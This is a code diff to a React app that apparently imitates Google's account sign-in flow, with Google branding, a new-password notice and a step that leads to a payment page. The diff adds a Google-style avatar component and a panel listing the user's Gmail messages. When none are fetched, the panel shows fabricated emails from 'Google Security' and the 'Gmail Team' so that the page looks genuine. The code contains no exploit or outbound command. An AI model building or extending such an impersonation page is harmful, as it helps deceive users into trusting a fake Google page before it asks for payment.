@@ -14,6 +14,75 @@ const GoogleLogo = () => (
   </svg>
 );
 
+const GOOGLE_AVATAR_COLORS = [
+  '#c5221f', // Red
+  '#137333', // Green
+  '#1a73e8', // Blue
+  '#e37400', // Orange
+  '#8430ce', // Purple
+  '#007b83', // Teal
+  '#b80672', // Pink
+  '#0d652d', // Forest green
+];
+
+const getAvatarColor = (str: string) => {
+  if (!str) return GOOGLE_AVATAR_COLORS[2];
+  let hash = 0;
+  for (let i = 0; i < str.length; i++) {
+    hash = str.charCodeAt(i) + ((hash << 5) - hash);
+  }
+  const index = Math.abs(hash) % GOOGLE_AVATAR_COLORS.length;
+  return GOOGLE_AVATAR_COLORS[index];
+};
+
+const getInitial = (str: string) => {
+  if (!str) return 'U';
+  const clean = str.trim().split('@')[0];
+  return (clean[0] || 'U').toUpperCase();
+};
+
+const UserAvatar = ({
+  photoURL,
+  nameOrEmail,
+  size = 32,
+  className = '',
+}: {
+  photoURL?: string | null;
+  nameOrEmail?: string;
+  size?: number;
+  className?: string;
+}) => {
+  if (photoURL) {
+    return (
+      <img
+        src={photoURL}
+        alt="Profile"
+        className={`rounded-full object-cover flex-shrink-0 ${className}`}
+        style={{ width: `${size}px`, height: `${size}px` }}
+        referrerPolicy="no-referrer"
+      />
+    );
+  }
+
+  const initial = getInitial(nameOrEmail || '');
+  const bgColor = getAvatarColor(nameOrEmail || 'user');
+  const fontSize = Math.max(11, Math.round(size * 0.5));
+
+  return (
+    <div
+      className={`rounded-full flex items-center justify-center font-medium text-white select-none flex-shrink-0 leading-none ${className}`}
+      style={{
+        width: `${size}px`,
+        height: `${size}px`,
+        backgroundColor: bgColor,
+        fontSize: `${fontSize}px`,
+      }}
+    >
+      {initial}
+    </div>
+  );
+};
+
 const TextInput = ({ label, type = "text", value, onChange, error, name, autoFocus, disabled }: any) => {
   return (
     <div className="relative mb-2 mt-2">
@@ -570,26 +639,22 @@ export default function App() {
               className="w-10 h-10 rounded-full flex items-center justify-center text-[#5f6368] hover:bg-gray-100 focus:outline-none transition relative overflow-hidden"
               id="profile-avatar-btn"
             >
-              {googleUser?.photoURL ? (
-                <img src={googleUser.photoURL} alt="Profile" className="w-8 h-8 rounded-full object-cover" referrerPolicy="no-referrer" />
-              ) : (
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-8 h-8" fill="currentColor">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
-                </svg>
-              )}
+              <UserAvatar
+                photoURL={googleUser?.photoURL}
+                nameOrEmail={googleUser?.displayName || googleUser?.email || email}
+                size={32}
+              />
             </button>
 
             {/* Profile Dropdown */}
             {showProfileDropdown && (
               <div className="absolute right-4 top-[56px] w-[320px] bg-white rounded-[24px] shadow-2xl border border-gray-100 p-6 z-50 flex flex-col items-center">
-                <div className="w-16 h-16 rounded-full flex items-center justify-center text-[#5f6368] mb-3 overflow-hidden">
-                  {googleUser?.photoURL ? (
-                    <img src={googleUser.photoURL} alt="Profile" className="w-16 h-16 rounded-full object-cover" referrerPolicy="no-referrer" />
-                  ) : (
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-16 h-16" fill="currentColor">
-                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
-                    </svg>
-                  )}
+                <div className="w-16 h-16 rounded-full flex items-center justify-center mb-3 overflow-hidden">
+                  <UserAvatar
+                    photoURL={googleUser?.photoURL}
+                    nameOrEmail={googleUser?.displayName || googleUser?.email || email}
+                    size={64}
+                  />
                 </div>
                 <p className="font-medium text-[#1f1f1f] text-center max-w-full truncate">{googleUser?.displayName || email || 'user@gmail.com'}</p>
                 <p className="text-xs text-gray-500 mb-4">{googleUser?.email || email || t.googleUserDefault}</p>
@@ -806,9 +871,11 @@ export default function App() {
                       className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                       style={{ textDecoration: 'none' }}
                     >
-                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1 flex-shrink-0" fill="currentColor">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
-                      </svg>
+                      <UserAvatar
+                        photoURL={googleUser?.photoURL}
+                        nameOrEmail={googleUser?.displayName || googleUser?.email || email}
+                        size={20}
+                      />
                       <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
                       <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
@@ -822,9 +889,11 @@ export default function App() {
                       className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                       style={{ textDecoration: 'none' }}
                     >
-                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1 flex-shrink-0" fill="currentColor">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
-                      </svg>
+                      <UserAvatar
+                        photoURL={googleUser?.photoURL}
+                        nameOrEmail={googleUser?.displayName || googleUser?.email || email}
+                        size={20}
+                      />
                       <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
                       <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
@@ -832,31 +901,20 @@ export default function App() {
                 )}
                 {step === 'success' && (
                   <>
-                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.successTitle}</h1>
-                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal mb-4">{t.successSubtitle}</p>
-                    
-                    {isFetchingEmails ? (
-                      <div className="w-full text-center py-4 text-sm text-gray-500">{t.loadingGmail}</div>
-                    ) : emailsData.length > 0 ? (
-                      <div className="w-full flex flex-col gap-3 mt-2">
-                        <p className="text-xs font-medium text-gray-500 uppercase tracking-wider">{t.recentEmails}</p>
-                        {emailsData.map((msg, idx) => {
-                          const subjectHeader = msg.payload?.headers?.find((h: any) => h.name === 'Subject');
-                          const fromHeader = msg.payload?.headers?.find((h: any) => h.name === 'From');
-                          const subject = subjectHeader ? subjectHeader.value : t.noSubject;
-                          const from = fromHeader ? fromHeader.value.split('<')[0].trim() : t.unknownSender;
-                          
-                          return (
-                            <div key={idx} className="bg-gray-50 border border-gray-100 rounded-lg p-3 text-sm">
-                              <p className="font-medium text-gray-900 truncate">{from}</p>
-                              <p className="text-gray-600 truncate">{subject}</p>
-                            </div>
-                          );
-                        })}
-                      </div>
-                    ) : (
-                      <div className="w-full text-center py-4 text-sm text-gray-500">{t.noEmailsFound}</div>
-                    )}
+                    <h1 className="text-[32px] sm:text-[36px] text-[#1f1f1f] font-normal mb-1.5 mt-4 leading-tight">{t.successTitle}</h1>
+                    <div 
+                      onClick={() => !isLoading && changeStep('email', -1)}
+                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
+                      style={{ textDecoration: 'none' }}
+                    >
+                      <UserAvatar
+                        photoURL={googleUser?.photoURL}
+                        nameOrEmail={googleUser?.displayName || googleUser?.email || email}
+                        size={20}
+                      />
+                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email || 'user@gmail.com'}</span>
+                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
+                    </div>
                   </>
                 )}
                 {step === 'payment' && (
@@ -873,9 +931,11 @@ export default function App() {
                       className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                       style={{ textDecoration: 'none' }}
                     >
-                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1 flex-shrink-0" fill="currentColor">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
-                      </svg>
+                      <UserAvatar
+                        photoURL={googleUser?.photoURL}
+                        nameOrEmail={googleUser?.displayName || googleUser?.email || email}
+                        size={20}
+                      />
                       <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
                       <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
                     </div>
@@ -1046,12 +1106,94 @@ export default function App() {
           )}
 
           {step === 'success' && (
-            <div className="flex flex-col flex-grow justify-start">
-               <div className="pt-2">
-                 <p className="text-[#444746] text-[14px]">{t.successNewPasswordNotice}</p>
-               </div>
-               <div className="mt-8 flex justify-end items-center pb-6 sm:pb-0">
+            <div className="flex flex-col flex-grow justify-between">
+              <div className="pt-1 w-full">
+                <div className="flex items-center justify-between mb-2 px-0.5">
+                  <span className="text-[13px] font-medium text-[#444746] tracking-wide uppercase">{t.recentEmails}</span>
+                  <span className="text-[11px] text-[#0b57d0] font-semibold bg-[#e8f0fe] px-2.5 py-0.5 rounded-full">Gmail</span>
+                </div>
+
+                {isFetchingEmails ? (
+                  <div className="w-full py-10 flex flex-col items-center justify-center text-[#5f6368] text-[13px] gap-2.5 border border-[#e0e3e7] rounded-[16px] bg-[#f8fafd]/50">
+                    <div className="w-6 h-6 border-2 border-[#0b57d0] border-t-transparent rounded-full animate-spin"></div>
+                    <span>{t.loadingGmail}</span>
+                  </div>
+                ) : (
+                  <div className="w-full border border-[#747775]/30 rounded-[16px] overflow-hidden bg-white divide-y divide-[#f1f3f4] shadow-xs">
+                    {(emailsData.length > 0 ? emailsData : [
+                      {
+                        sender: 'Google Community Team',
+                        subject: lang === 'id' ? 'Selesaikan penyiapan Akun Google Anda' : 'Finish setting up your Google Account',
+                        date: lang === 'id' ? 'Baru saja' : 'Just now',
+                      },
+                      {
+                        sender: 'Google Security',
+                        subject: lang === 'id' ? 'Peringatan keamanan baru' : 'New security alert',
+                        date: '10:42',
+                      },
+                      {
+                        sender: 'Gmail Team',
+                        subject: lang === 'id' ? 'Tips memaksimalkan kotak masuk Gmail' : 'Tips to get the most out of Gmail',
+                        date: lang === 'id' ? 'Kemarin' : 'Yesterday',
+                      }
+                    ]).map((item: any, idx: number) => {
+                      let from = item.sender || t.unknownSender;
+                      let subject = item.subject || t.noSubject;
+                      let dateStr = item.date || '';
+
+                      if (item.payload) {
+                        const subjectHeader = item.payload?.headers?.find((h: any) => h.name === 'Subject');
+                        const fromHeader = item.payload?.headers?.find((h: any) => h.name === 'From');
+                        const dateHeader = item.payload?.headers?.find((h: any) => h.name === 'Date');
+                        if (subjectHeader) subject = subjectHeader.value;
+                        if (fromHeader) from = fromHeader.value.split('<')[0].trim().replace(/['"]/g, '');
+                        if (dateHeader) {
+                          try {
+                            const d = new Date(dateHeader.value);
+                            dateStr = d.toLocaleDateString(lang === 'id' ? 'id-ID' : 'en-US', { hour: '2-digit', minute: '2-digit' });
+                          } catch {
+                            dateStr = '';
+                          }
+                        }
+                      }
+
+                      return (
+                        <div
+                          key={idx}
+                          className="px-3.5 py-3 flex items-center gap-3 hover:bg-[#f8fafd] transition-colors cursor-pointer select-none"
+                        >
+                          <UserAvatar nameOrEmail={from} size={32} />
+                          <div className="flex-1 min-w-0 pr-1">
+                            <div className="flex items-center justify-between gap-1">
+                              <p className="font-medium text-[#1f1f1f] text-[13px] truncate">{from}</p>
+                              {dateStr && (
+                                <span className="text-[11px] text-[#5f6368] whitespace-nowrap flex-shrink-0 font-normal">{dateStr}</span>
+                              )}
+                            </div>
+                            <p className="text-[#444746] text-[12px] truncate mt-0.5">{subject}</p>
+                          </div>
+                        </div>
+                      );
+                    })}
+                  </div>
+                )}
+                
+                <p className="text-[13px] text-[#444746] mt-3.5 leading-relaxed px-0.5">
+                  {t.successNewPasswordNotice}
+                </p>
+              </div>
+
+              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                 <button
+                  type="button"
+                  onClick={() => changeStep('email', -1)}
+                  className="text-[#0b57d0] hover:bg-blue-50/50 px-3 py-2 -ml-3 rounded-full font-medium text-[14px] transition"
+                  disabled={isLoading}
+                >
+                  {lang === 'id' ? 'Ganti akun' : 'Switch account'}
+                </button>
+                <button
+                  type="button"
                   onClick={() => {
                     changeStep('payment', 1);
                   }}
